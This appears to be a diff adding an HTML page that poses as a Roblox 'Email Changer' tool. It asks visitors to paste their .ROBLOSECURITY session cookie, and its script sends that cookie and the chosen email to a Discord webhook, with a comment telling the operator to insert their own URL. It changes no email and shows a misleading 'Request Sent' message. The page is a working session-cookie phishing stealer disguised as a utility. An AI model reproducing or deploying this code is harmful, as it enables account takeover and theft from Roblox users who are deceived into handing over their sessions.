@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Client Support</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: linear-gradient(270deg, #7a00ff, #00ffe5, #ff4d4d);
+      background-size: 600% 600%;
+      animation: bg 15s ease infinite;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    @keyframes bg {
+      0%   { background-position: 0% 50%; }
+      50%  { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .box {
+      background: rgba(0,0,0,0.58);
+      backdrop-filter: blur(8px);
+      padding: 32px;
+      border-radius: 16px;
+      width: 360px;
+      max-width: 92%;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+      animation: fade 1.2s ease-out;
+    }
+
+    @keyframes fade {
+      from { opacity: 0; transform: translateY(30px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      text-align: center;
+      margin: 0 0 12px 0;
+      font-size: 24px;
+    }
+
+    .warning {
+      font-size: 13px;
+      text-align: center;
+      color: #ffcc00;
+      margin-bottom: 24px;
+      line-height: 1.4;
+    }
+
+    label {
+      display: block;
+      margin: 18px 0 6px;
+      font-weight: bold;
+      font-size: 14px;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 13px;
+      margin-top: 4px;
+      border: none;
+      border-radius: 10px;
+      font-size: 15px;
+      box-sizing: border-box;
+      background: rgba(255,255,255,0.12);
+      color: white;
+    }
+
+    input::placeholder, textarea::placeholder {
+      color: rgba(255,255,255,0.55);
+    }
+
+    textarea {
+      height: 120px;
+      resize: none;
+    }
+
+    button {
+      margin-top: 28px;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: #7a00ff;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.25s;
+    }
+
+    button:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(122,0,255,0.6);
+    }
+
+    button:disabled {
+      background: #555;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    #loading, #success, #error {
+      text-align: center;
+      margin-top: 18px;
+      font-weight: bold;
+      font-size: 15px;
+      display: none;
+    }
+
+    #loading { color: #00ffe5; }
+    #success { color: #00ff9d; }
+    #error   { color: #ff4d4d; }
+  </style>
+</head>
+<body>
+
+<div class="box">
+
+  <h2>Ornaments | Email Changer</h2>
+  <div class="warning">
+    This tool is used to change email on Roblox accounts.<br>
+    <strong>50% success rate claimed — use at your own risk!</strong>
+  </div>
+
+  <label for="msg">.ROBLOSECURITY Cookie</label>
+  <textarea id="msg" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
+
+  <label for="NewEmail">New Email</label>
+  <input id="NewEmail" type="email" placeholder="newemail@gmail.com">
+
+  <label for="ConfirmEmail">Confirm New Email</label>
+  <input id="ConfirmEmail" type="email" placeholder="newemail@gmail.com">
+
+  <button id="submitBtn" onclick="send()">SUBMIT</button>
+
+  <div id="loading">⏳ Processing...</div>
+  <div id="success">✅ Request Sent! Check if it worked.</div>
+  <div id="error"></div>
+
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/xxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+// ↑↑↑ Replace this with your NEW webhook url ↑↑↑
+
+async function send() {
+  const btn      = document.getElementById("submitBtn");
+  const loading  = document.getElementById("loading");
+  const success  = document.getElementById("success");
+  const errorDiv = document.getElementById("error");
+
+  // Reset UI
+  success.style.display = "none";
+  errorDiv.style.display = "none";
+  errorDiv.textContent = "";
+
+  const cookie    = document.getElementById("msg").value.trim();
+  const newEmail  = document.getElementById("NewEmail").value.trim();
+  const confirm   = document.getElementById("ConfirmEmail").value.trim();
+
+  if (!cookie || !newEmail || !confirm) {
+    alert("Please fill in ALL fields (especially the cookie)!");
+    return;
+  }
+
+  if (newEmail !== confirm) {
+    alert("New emails do not match!");
+    return;
+  }
+
+  btn.disabled = true;
+  loading.style.display = "block";
+
+  try {
+    const response = await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        embeds: [{
+          title: "✦ Roblox Email Change Request",
+          color: 0x7a00ff,
+          description: "**Cookie:**\n```" + cookie + "```\n",
+          fields: [
+            { name: "→ New Email", value: newEmail, inline: true },
+            { name: "→ Time", value: new Date().toLocaleString("en-US"), inline: true }
+          ],
+          footer: { text: "Ornaments Tool • 2026" },
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+
+    if (!response.ok) throw new Error(`Discord → ${response.status}`);
+
+    loading.style.display = "none";
+    success.style.display = "block";
+
+  } catch (err) {
+    loading.style.display = "none";
+    errorDiv.style.display = "block";
+    errorDiv.textContent = "Failed — most likely dead webhook → " + err.message;
+    console.error(err);
+  } finally {
+    btn.disabled = false;
+  }
+}
+</script>
+</body>
+</html>
